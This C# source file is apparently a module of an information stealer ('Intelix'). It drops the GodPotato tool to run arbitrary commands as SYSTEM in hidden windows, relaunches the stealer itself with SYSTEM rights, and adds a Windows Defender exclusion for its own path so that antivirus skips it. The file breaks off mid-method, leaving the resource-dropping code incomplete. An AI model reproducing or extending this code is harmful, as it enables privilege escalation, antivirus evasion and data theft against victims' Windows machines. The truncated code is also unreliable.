using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;

namespace Intelix.PrivilegeEscalation
{
    public static class GodPotato
    {
        private static readonly string PotatoName = "GodPotato.exe";
        // Check finding potato in current dir first, else use temp
        private static string TargetPath 
        {
            get 
            {
                string current = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PotatoName);
                if (File.Exists(current)) return current;
                return Path.Combine(Path.GetTempPath(), PotatoName);
            }
        }

        public static bool IsSystem()
        {
            using (var identity = WindowsIdentity.GetCurrent())
            {
                return identity.IsSystem;
            }
        }

        // Centralized helper to run ANY command as SYSTEM via GodPotato
        // Cmd: "cmd /c whoami" or "powershell -c ..."
        public static void RunAsSystem(string command)
        {
            try
            {
                // Ensure potato is there
                if (!DropResource()) return;

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = TargetPath,
                    Arguments = $"-cmd \"{command}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }

        public static void Escalate()
        {
            if (IsSystem()) return;

            try
            {
                // Execute current stealer with SYSTEM privileges
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                
                // Quote path in case of spaces
                RunAsSystem($"\\\"{currentExe}\\\"");
                
                // Terminate current low-privilege process
                Environment.Exit(0);
            }
            catch (Exception)
            {
            }
        }

        public static void AddExclusion()
        {
             try
             {
                 string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                 // Use double quotes for the inner PS command string to survive wrapping
                 string psCommand = $"powershell -Command \\\"Add-MpPreference -ExclusionPath '{currentPath}'\\\"";
                 
                 RunAsSystem(psCommand);
             }
             catch { }
        }

        private static bool DropResource()
        {
            if (File.Exists(TargetPath)) return true;

    }
}
